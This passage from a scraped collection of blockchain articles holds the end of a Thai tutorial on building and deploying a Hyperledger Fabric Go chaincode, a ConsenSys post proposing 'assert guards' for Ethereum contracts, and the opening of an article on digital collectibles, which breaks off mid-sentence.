\u0e01\u0e48\u0e2d\u0e19\u0e42\u0e14\u0e22\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e44\u0e1b\u0e14\u0e49\u0e32\u0e19\u0e25\u0e48\u0e32\u0e07\u0e02\u0e2d\u0e07\u0e42\u0e04\u0e49\u0e14\u0e14\u0e49\u0e32\u0e19\u0e1a\u0e19func (t *SimpleAsset) Init(stub shim.ChaincodeStubInterface) peer.Response {  args := stub.GetStringArgs()  if len(args) != 2 {    return shim.Error(\"Incorrect arguments. Expecting a key and a value\")  }  err := stub.PutState(args[0], []byte(args[1]))  if err != nil {    return shim.Error(fmt.Sprintf(\"Failed to create asset: %s\", args[0]))  }  return shim.Success(nil)}\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32 Init \u0e40\u0e23\u0e32\u0e23\u0e31\u0e1a Parameter \u0e40\u0e1b\u0e47\u0e19 ChaincodeStubInterface \u0e0a\u0e37\u0e48\u0e2d stub \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e27\u0e25\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e34\u0e14\u0e15\u0e48\u0e2d\u0e01\u0e31\u0e1a Chaincode \u0e01\u0e47\u0e08\u0e30\u0e43\u0e0a\u0e49 stub \u0e15\u0e31\u0e27\u0e19\u0e35\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e17\u0e33\u0e07\u0e32\u0e19\u0e01\u0e32\u0e23\u0e23\u0e31\u0e1a Parameter \u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e40\u0e23\u0e35\u0e22\u0e01\u0e44\u0e1b\u0e17\u0e35\u0e48 Init \u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e2d\u0e22\u0e39\u0e48\u0e17\u0e35\u0e48 stub.GetStringArgs() \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e44\u0e14\u0e49\u0e21\u0e32\u0e40\u0e1b\u0e47\u0e19 Array \u0e02\u0e2d\u0e07 String \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e0a\u0e47\u0e04\u0e27\u0e48\u0e32\u0e21\u0e35 2 \u0e15\u0e31\u0e27\u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e1b\u0e25\u0e48\u0e32\u0e42\u0e14\u0e22 len(args) \u0e0b\u0e36\u0e48\u0e07\u0e15\u0e31\u0e27\u0e41\u0e23\u0e01\u0e04\u0e37\u0e2d key \u0e41\u0e25\u0e30\u0e15\u0e31\u0e27\u0e17\u0e35\u0e48\u0e2a\u0e2d\u0e07\u0e04\u0e37\u0e2d value \u0e02\u0e2d\u0e07\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e08\u0e30 Init \u0e19\u0e31\u0e48\u0e19\u0e40\u0e2d\u0e07\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e44\u0e14\u0e49\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e21\u0e32\u0e41\u0e25\u0e49\u0e27\u0e17\u0e31\u0e49\u0e07 key \u0e41\u0e25\u0e30 value \u0e40\u0e23\u0e32\u0e01\u0e47\u0e08\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 Blockchain \u0e14\u0e49\u0e27\u0e22 stub.PutState(key, []byte(value)) \u0e41\u0e25\u0e49\u0e27\u0e40\u0e0a\u0e47\u0e04 Error \u0e16\u0e49\u0e32\u0e40\u0e01\u0e34\u0e14\u0e01\u0e32\u0e23 Error \u0e01\u0e47\u0e08\u0e30 return shim.Error \u0e2a\u0e48\u0e27\u0e19\u0e16\u0e49\u0e32\u0e44\u0e21\u0e48\u0e40\u0e01\u0e34\u0e14 Error \u0e01\u0e47\u0e08\u0e30 return shim.Success \u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23\u0e08\u0e1a\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19 Init \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19 Invoke\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e32 Init \u0e41\u0e25\u0e49\u0e27\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19 Invoke \u0e08\u0e30\u0e17\u0e33\u0e07\u0e32\u0e19\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e17\u0e35\u0e48\u0e40\u0e2b\u0e25\u0e37\u0e2d\u0e43\u0e19 Blockchain \u0e42\u0e14\u0e22\u0e1b\u0e23\u0e30\u0e01\u0e32\u0e28\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19\u0e01\u0e31\u0e1a Init \u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e15\u0e48\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e0a\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e47\u0e19 Invokefunc (t *SimpleAsset) Invoke(stub shim.ChaincodeStubInterface) peer.Response {}\u0e20\u0e32\u0e22\u0e43\u0e19 Invoke \u0e40\u0e23\u0e32\u0e08\u0e30\u0e23\u0e31\u0e1a Parameter \u0e08\u0e32\u0e01 stub \u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 stub.GetFunctionAndParameters \u0e0b\u0e36\u0e48\u0e07\u0e41\u0e1b\u0e25\u0e27\u0e48\u0e32\u0e1d\u0e31\u0e48\u0e07\u0e17\u0e35\u0e48\u0e2a\u0e31\u0e48\u0e07\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e33\u0e01\u0e32\u0e23\u0e2a\u0e48\u0e07\u0e0a\u0e37\u0e48\u0e2d\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e14\u0e49\u0e27\u0e22 Parameters \u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e21\u0e32\u0e14\u0e49\u0e27\u0e22\u0e16\u0e36\u0e07\u0e08\u0e30\u0e17\u0e33\u0e07\u0e32\u0e19\u0e44\u0e14\u0e49    fn, args := stub.GetFunctionAndParameters()    var result string    var err error    if fn == \"set\" {            result, err = set(stub, args)    } else {            result, err = get(stub, args)    }    if err != nil {            return shim.Error(err.Error())    }    // Return the result as success payload    return shim.Success([]byte(result))\u0e42\u0e14\u0e22\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19\u0e17\u0e35\u0e48\u0e40\u0e23\u0e35\u0e22\u0e01\u0e44\u0e14\u0e49\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e21\u0e35 2 \u0e15\u0e31\u0e27\u0e04\u0e37\u0e2d set \u0e41\u0e25\u0e30 get \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19\u0e41\u0e22\u0e01\u0e44\u0e27\u0e49\u0e2d\u0e35\u0e01\u0e17\u0e35func set(stub shim.ChaincodeStubInterface, args []string) (string, error) {    if len(args) != 2 {            return \"\", fmt.Errorf(\"Incorrect arguments. Expecting a key and a value\")    }    err := stub.PutState(args[0], []byte(args[1]))    if err != nil {            return \"\", fmt.Errorf(\"Failed to set asset: %s\", args[0])    }    return args[1], nil}// Get returns the value of the specified asset keyfunc get(stub shim.ChaincodeStubInterface, args []string) (string, error) {    if len(args) != 1 {            return \"\", fmt.Errorf(\"Incorrect arguments. Expecting a key\")    }    value, err := stub.GetState(args[0])    if err != nil {            return \"\", fmt.Errorf(\"Failed to get asset: %s with error: %s\", args[0], err)    }    if value == nil {            return \"\", fmt.Errorf(\"Asset not found: %s\", args[0])    }    return string(value), nil}\u0e43\u0e19 set \u0e41\u0e25\u0e30 get \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e01\u0e47\u0e08\u0e30\u0e40\u0e23\u0e35\u0e22\u0e01\u0e43\u0e0a\u0e49 PutState \u0e01\u0e31\u0e1a GetState \u0e15\u0e32\u0e21\u0e25\u0e33\u0e14\u0e31\u0e1a\u0e44\u0e21\u0e48\u0e21\u0e35\u0e2d\u0e30\u0e44\u0e23\u0e0b\u0e31\u0e1a\u0e0b\u0e49\u0e2d\u0e19 \u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19 main \u0e14\u0e49\u0e27\u0e22func main() {    if err := shim.Start(new(SimpleAsset)); err != nil {            fmt.Printf(\"Error starting SimpleAsset chaincode: %s\", err)    }}\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e23\u0e27\u0e21\u0e42\u0e04\u0e49\u0e14\u0e44\u0e27\u0e49\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e08\u0e30\u0e44\u0e14\u0e49\u0e14\u0e31\u0e07\u0e25\u0e34\u0e07\u0e01\u0e4c\u0e19\u0e35\u0e49\u0e04\u0e23\u0e31\u0e1a https://gist.github.com/methuz/c08abc755c7cfbbe213984eb927005edBuild Code\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e04\u0e49\u0e14\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e33\u0e01\u0e32\u0e23\u0e17\u0e14\u0e25\u0e2d\u0e07 build \u0e41\u0e15\u0e48\u0e01\u0e48\u0e2d\u0e19\u0e08\u0e30 build \u0e44\u0e14\u0e49\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07 go get shim \u0e21\u0e32\u0e01\u0e48\u0e2d\u0e19go get -u --tags nopkcs11 github.com/hyperledger/fabric/core/chaincode/shim\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c shim \u0e21\u0e32\u0e43\u0e19\u00a0$GOPAH\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e17\u0e33\u0e01\u0e32\u0e23 buildgo build --tags nopkcs11\u0e16\u0e49\u0e32\u0e44\u0e21\u0e48\u0e21\u0e35\u0e2d\u0e30\u0e44\u0e23\u0e1c\u0e34\u0e14\u0e1b\u0e01\u0e15\u0e34\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e44\u0e1f\u0e25\u0e4c sacc\u00a0\u0e21\u0e32\u0e19\u0e33\u0e44\u0e1f\u0e25\u0e4c\u0e44\u0e1b Mount\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19 Chaincode \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e33\u0e01\u0e32\u0e23 mount \u0e44\u0e1f\u0e25\u0e4c\u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Peer \u0e0b\u0e36\u0e48\u0e07\u0e43\u0e19\u0e17\u0e35\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 network \u0e43\u0e19\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c chaincode-docker-devmode \u0e0b\u0e36\u0e48\u0e07\u0e44\u0e1f\u0e25\u0e4c compose \u0e02\u0e2d\u0e07\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e19\u0e35\u0e49\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32 mount\u00a0./../chaincode \u0e44\u0e1b\u0e17\u0e35\u0e48 /opt/gopath/src/chaincode\u0e0b\u0e36\u0e48\u0e07\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e44\u0e1b\u0e14\u0e39\u0e43\u0e19\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c Chaincode \u0e40\u0e23\u0e32\u0e08\u0e30\u0e1e\u0e1a\u0e27\u0e48\u0e32\u0e21\u0e35\u0e44\u0e1f\u0e25\u0e4c sacc \u0e02\u0e2d\u0e40\u0e23\u0e32\u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27 \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e09\u0e30\u0e19\u0e31\u0e49\u0e19\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07 copy \u0e21\u0e32\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e15\u0e48\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19 Chaincode \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e43\u0e2b\u0e21\u0e48 \u0e40\u0e23\u0e32\u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07 copy \u0e21\u0e32\u0e44\u0e27\u0e49\u0e17\u0e35\u0e48\u0e19\u0e35\u0e48\u0e2b\u0e23\u0e37\u0e2d\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19\u0e01\u0e47\u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27\u0e01\u0e47\u0e41\u0e01\u0e49 compose file \u0e40\u0e1e\u0e37\u0e48\u0e2d mount \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 peer \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23 install chaincode \u0e08\u0e23\u0e34\u0e07 \u0e46 \u0e1a\u0e19 peerStart network\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e17\u0e35\u0e48\u0e1a\u0e2d\u0e01\u0e44\u0e1b\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 network \u0e02\u0e2d\u0e07 chaincode-docker-devmode \u0e43\u0e19 fabric-samples \u0e01\u0e47\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32 cd \u0e44\u0e1b\u0e17\u0e35\u0e48\u0e19\u0e31\u0e48\u0e19\u0e41\u0e25\u0e49\u0e27\u0e23\u0e31\u0e19docker-compose -f docker-compose-simple.yaml up\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e01\u0e32\u0e23 docker up \u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e44\u0e21\u0e48\u0e21\u0e35\u0e2d\u0e30\u0e44\u0e23\u0e1c\u0e34\u0e14\u0e1e\u0e25\u0e32\u0e14\u0e40\u0e23\u0e32\u0e01\u0e47\u0e08\u0e30\u0e44\u0e14\u0e49 docker \u0e21\u0e32 4 containers \u0e14\u0e31\u0e07\u0e19\u0e35\u0e49Build \u0e41\u0e25\u0e30\u00a0Register\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 container \u0e0a\u0e37\u0e48\u0e2d bash \u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07docker exec -it chaincode bash\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e17\u0e35\u0e48\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c sacc \u0e41\u0e25\u0e49\u0e27\u0e17\u0e33\u0e01\u0e32\u0e23 go build \u0e1a\u0e19\u0e19\u0e35\u0e49\u0e02\u0e49\u0e2d\u0e04\u0e27\u0e23\u0e23\u0e30\u0e27\u0e31\u0e07 binary file \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e17\u0e33\u0e01\u0e32\u0e23 build \u0e1a\u0e19 MacOS \u0e2d\u0e32\u0e08\u0e43\u0e0a\u0e49\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e1a\u0e19 Linux Container \u0e40\u0e23\u0e32\u0e04\u0e27\u0e23 build \u0e1a\u0e19\u0e19\u0e35\u0e49\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e44\u0e14\u0e49\u0e44\u0e1f\u0e25\u0e4c sacc \u0e21\u0e32\u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e17\u0e33\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19 Chaincode \u0e40\u0e1e\u0e37\u0e48\u0e2d Register Chaincode \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 PeerCORE_PEER_ADDRESS=peer:7051 CORE_CHAINCODE_ID_NAME=mycc:0 ./saccInstall Chaincode\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e40\u0e23\u0e32 Register Chaincode \u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e33\u0e01\u0e32\u0e23 Install \u0e41\u0e25\u0e30 Instatiate Chaincode \u0e25\u0e07\u0e44\u0e1b\u0e1a\u0e19 Channel \u0e14\u0e49\u0e27\u0e22\u0e42\u0e14\u0e22\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 Docker Container \u0e17\u0e35\u0e48\u0e0a\u0e37\u0e48\u0e2d clidocker exec -it cli bash\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e17\u0e33\u0e01\u0e32\u0e23 Install Chaincode \u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07peer chaincode install -p chaincodedev/chaincode/sacc -n mycc -v 0\u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23 Install Chaincode \u0e08\u0e32\u0e01\u0e44\u0e1f\u0e25\u0e4c sacc \u0e44\u0e1b\u0e43\u0e19\u0e0a\u0e37\u0e48\u0e2d mycc \u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 0Instantiate and\u00a0Invoke\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e04\u0e48\u0e32\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e49\u0e19\u0e02\u0e2d\u0e07 Chaincode \u0e2b\u0e23\u0e37\u0e2d\u0e01\u0e32\u0e23 Instantiate \u0e42\u0e14\u0e22\u0e23\u0e31\u0e19peer chaincode instantiate -n mycc -v 0 -c '{\"Args\":[\"a\",\"10\"]}' -C myc\u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32 a = 10 \u0e44\u0e1b\u0e1a\u0e19 mycc \u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 0 \u0e1a\u0e19 Channel \u0e0a\u0e37\u0e48\u0e2d myc\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e17\u0e33\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e49\u0e19\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e2d\u0e07\u0e43\u0e0a\u0e49\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19 set \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e27\u0e49\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 a \u0e40\u0e1b\u0e47\u0e19 20\u0e42\u0e14\u0e22\u0e23\u0e31\u0e19peer chaincode invoke -n mycc -c '{\"Args\":[\"set\", \"a\", \"20\"]}' -C myc\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e44\u0e14\u0e49\u0e27\u0e48\u0e32\u0e17\u0e33\u0e01\u0e32\u0e23 invoke \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08\u0e41\u0e25\u0e30\u0e44\u0e14\u0e49\u0e04\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19 20 \u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e2d\u0e07 get \u0e14\u0e39\u0e42\u0e14\u0e22peer chaincode query -n mycc -c '{\"Args\":[\"query\",\"a\"]}' -C myc\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e1c\u0e25\u0e25\u0e31\u0e1e\u0e18\u0e4c\u0e40\u0e17\u0e48\u0e32\u0e01\u0e31\u0e1a 20\u0e2a\u0e48\u0e07\u0e17\u0e49\u0e32\u0e22\u0e08\u0e32\u0e01\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e01\u0e47\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e35\u0e22\u0e19 Chaincode \u0e2b\u0e23\u0e37\u0e2d Smart Contract \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e01\u0e47\u0e1a\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e17\u0e35\u0e48\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e23\u0e27\u0e21\u0e01\u0e31\u0e1a NodeJs Application \u0e43\u0e19\u0e1a\u0e17\u0e17\u0e35\u0e48\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e01\u0e47\u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e17\u0e35\u0e48\u0e08\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Permissioned Blockchain Application \u0e41\u0e25\u0e49\u0e27\u0e04\u0e23\u0e31\u0e1a \u0e02\u0e2d\u0e43\u0e2b\u0e49\u0e2a\u0e19\u0e38\u0e01\u0e01\u0e31\u0e1a\u0e42\u0e25\u0e01 Permissioned Blockchain \u0e04\u0e23\u0e31\u0e1a\u0e1c\u0e21Source\u00a0: http://hyperledger-fabric.readthedocs.io/en/release/chaincode4ade.html", "responses": "1"}, {"title": "Assert Guards: Towards Automated Code Bounties & Safe Smart Contract Coding on\u00a0Ethereum", "author_name": "ConsenSys", "link": "https://medium.com/@ConsenSys/assert-guards-towards-automated-code-bounties-safe-smart-contract-coding-on-ethereum-8e74364b795c?source=search_post", "post_date": "May 5, 2016", "readtime": "3 min read", "upvotes": "36", "content": "Assert Guards: Towards Automated Code Bounties & Safe Smart Contract Coding on\u00a0EthereumConsenSysBlockedUnblockFollowFollowingMay 5, 2016With great power comes great responsibility. Once uploaded, the code on Ethereum runs exactly as programmed\u2026 forever. That is one of the platform\u2019s core benefits: code that always interoperates as promised, can\u2019t be tampered with, and has no down time. You don\u2019t have to trust the creator or hosting, only the code.Except, that comes with a price. As we all know, bugs always creep up. In fact, in Ethereum, there\u2019s already been circumstances where this code, which you can\u2019t replace, has caused trouble.How do you make sure there are no bugs in production, and how do you make sure you retain the trustless powers of Ethereum? One can build code that allows others to change the code. However, this gets us back to square one: needing to trust that the owners of the code haven\u2019t been and won\u2019t be hacked and that they aren\u2019t malevolent.Various members and groups in the community have contributed to finding ways around this [1]. I\u2019ve combined these ideas and some of my own into a concept called \u201cassert guards\u201d.It is code on Ethereum that guards other code. The code can only be changed if a test case\u00a0fails.It works as follows:1) Write your contract tests in Solidity.2) Attached to your primary contract code is other code, called an \u201cassert guard\u201d contract. Attached to it is the tests, as well as the primary code. It has a multi-sig of owners capable of changing the primary contract code.3) If deployed, the owners can\u2019t change the primary contract code.4) If an \u201cassert\u201d fails, then the guard can block all requests to core code & let the multi-sig owners back \u201cin\u201d to be able to change the core contract code (or the tests).5) Once fixed (the code owners have changed the code), the assert guard blocks access to changing the code and opens up requests again. If an assert failure happens again, it repeats the process.6) This can be combined with a relative or fixed lock. Relative == after every fix, if there\u2019s no assert failure after a subsequent 6 months, then the guard ossifies forever, become fully autonomous & trustless. Any new assert failures won\u2019t trigger the guard anymore. A fixed lock is based on the time of deployment. It\u2019s not based on whether assert failures are found. In other words: eg, in 6 months time from deployment, if there was a failure or not, the guard will ossify.In order to incentivize bug hunting, bounties can be used.Automated bounties can be attached upon finding an assert failure. If automation seems unfair or potentially dangerous, it could simply log tx.origin & msg.sender and then pay out a bounty manually afterwards.More democratic ownership of code be done in the form of a DAO: stakeholders must vote on whether or not a fix looks good (instead of say a multi-sig of 3 devs).This means that (1) one can beta-test live code for a few months, (2) developers can fix code in this period if it breaks, (3) you don\u2019t have to be a Solidity expert to deploy functional dApps, and (4) after some time, it moves to the fully trustless power of the Ethereum platform.This method adds additional complexity, as well as additional costs, and merits discussion. If you have any thoughts, please share.by Simon de la Rouviere, Engineer of Societies at ConsenSys.[1] Bounties for test case failures & asserts letting developers back in, though I cannot recall where I read this. Please ping me if you have the source.", "responses": "2"}, {"title": "The Future of Digital Collectibles: Can Physical Goods Drive Smart Contract\u00a0Value?", "author_name": "Reza Jafery", "link": "https://hackernoon.com/the-future-of-digital-collectibles-can-physical-goods-drive-smart-contract-value-50813d12aa46?source=search_post", "post_date": "Jun 4, 2018", "readtime": "5 min read", "upvotes": "886", "content": "The Future of Digital Collectibles: Can Physical Goods Drive Smart Contract\u00a0Value?Reza JaferyBlockedUnblockFollowFollowingJun 4, 2018Immortalizing fine art on the blockchain, and the digital future we\u2019re heading towards.I\u2019ve played video games my entire life. The concept of intangible goods having value in a digital world wasn\u2019t hard for me to grasp. I believe that digital collectibles are going to shake up the internet, and provide an on-ramp for people to enter the cryptoasset market. When I talk to people who aren\u2019t familiar with blockchain about digital collectibles, it doesn\u2019t seem like they really understand, or care to understand. When I put a computer in front of them with some sort of digital representation of a smart contract, they fall down the rabbit hole. Pretty soon, people who had no knowledge of the space were helping me figure out how much Gwei I had to use to make my transactions go through.The year of the KittyJust one year ago, CryptoKitties swept over the crypto community with a wave of cute, cuddly pop culture. Many claimed that the app was little more than an overhyped development in the dApp space, but a year later, it\u2019s still going strong, and other new crypto collectibles are joining the market at a rapid rate. Websites like BlockchainCuties and EtherBots follow in its\u2019 paw-prints, slowly adding functionality and testing the limits of what we think is \u201cnormal\u201d. Because let\u2019s be honest, a couple years ago, hell even today, the thought of a digital kitten selling for over $100,000 might sound a little insane.A few months ago CryptoKitties raised $12 million USD in a round led by Andreesson Horrowitz and Union Square Ventures. Transaction volume on the platform is down significantly from the times of CryptoKitties going for $100,000+, but it seems like venture capitalists are still optimistic.It is as they say, institutional capital follows individual interest.Chart taken from this\u00a0articleA catalyst for mainstream adoptionPlatforms like CryptoKitties help bring new users into the space, but a recent project I stumbled upon can potentially bridge a different gap. On May 31, 2018, a new player in the digital collectible race launched.New York-based gaming company Tapinator, which boasts over 300 mobile games and 450 million downloads, announced the release of BitPainting, a crypto collectible platform that allows users to buy and sell famous paintings through the use of the blockchain. To be clear, this isn\u2019t a marketplace where you can use bitcoin to buy a Picasso. These famous paintings exist in the form of digital collectibles.While it\u2019s tempting to compare BitPainting to CryptoKitties, there is a key distinction. CryptoKitties\u2019 detractors argued that the app\u2019s users were all members of a tech-savvy crypto community and that the app lacked mainstream appeal. It brought new users to the Ethereum network, but was far from user friendly. BitPainting offers up a different model, tapping into both an audience of fine art lovers, and a speculative crowd foaming at the mouth to see how much a digital collectible representing the Mona Lisa can sell for.What really excites me about BitPainting, is the fact that these collectibles, in a way, represent a tangible item. In CryptoKitties, scarcity is created artificially through the use of \u201cGenerations\u201d. A Generation 1 collectible should in theory be worth more than a Generation 5 collectible. With BitPainting, it gets a little more interesting. I\u2019m extremely curious to see how the value of certain paintings on this platform compare to the value of their tangible counterparts. Will the digital Mona Lisa be as coveted as the physical?Pioneering change and increasing trustI\u2019m enthralled with the concept of digital collectibles, I see them as the easiest way for new people to start interacting with blockchain technology. The trick is making them user friendly enough for new users to give it a try. If executed correctly this could spur increases in market capitalization as new users clamor to get Ethereum and purchase their digital masterpieces. Which is why I\u2019m excited by BitPainting. Tapinator has released over 300 games, most of which have in-game marketplaces. They have the experience to make this work.Since transaction history is transparent and verifiable on the 